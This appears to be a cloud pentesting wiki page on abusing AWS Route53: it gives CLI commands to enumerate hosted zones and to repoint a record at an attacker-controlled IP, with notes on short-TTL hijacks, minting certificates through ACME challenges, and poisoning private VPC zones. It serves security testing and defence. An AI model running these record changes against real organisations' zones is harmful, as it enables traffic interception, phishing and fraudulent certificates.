---
title: "Route53: hijacking records and poisoning resolution"
description: "Abusing Route53 hosted zones and records to hijack names, poison resolution, and set up takeover."
keywords:
  - Route53
  - hosted zone
  - DNS record
  - hijack
  - resolution
---

# Route53

Write access to a Route53 hosted zone is write access to where the organization's names point. With `route53:ChangeResourceRecordSets` you repoint a record at infrastructure you control, which captures traffic, breaks TLS validation challenges, and enables phishing on a trusted name. Reading the zones also surfaces records whose targets no longer exist, feeding [dangling-DNS takeover](dangling-dns-takeover.md).

## Enumerating zones and records

```bash
aws route53 list-hosted-zones
aws route53 list-resource-record-sets --hosted-zone-id <zone-id> \
  --query "ResourceRecordSets[].[Name,Type,ResourceRecords[0].Value,AliasTarget.DNSName]"
```

## Repointing a record

```bash
aws route53 change-resource-record-sets --hosted-zone-id <zone-id> \
  --change-batch '{"Changes":[{"Action":"UPSERT","ResourceRecordSet":{
    "Name":"app.example.com","Type":"A","TTL":60,
    "ResourceRecords":[{"Value":"<attacker-ip>"}]}}]}'
```

## Exploitation notes

- A short TTL makes the hijack take effect fast and makes it easy to revert, which suits a time-boxed capture.
- Repointing an ACME-validated name lets you pass an HTTP-01 or DNS-01 challenge and mint a valid certificate for it.
- Private hosted zones steer resolution inside a VPC; poisoning one redirects internal clients without touching public DNS.

## Tools

- **AWS CLI** (`route53 ...`): zone enumeration and record changes.
- **ScoutSuite** / **Prowler**: inventory hosted zones and alias targets.

## References

- [HackTricks Cloud: AWS Route53](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-route53-enum.html)
- [AWS: ChangeResourceRecordSets](https://docs.aws.amazon.com/Route53/latest/APIReference/API_ChangeResourceRecordSets.html)
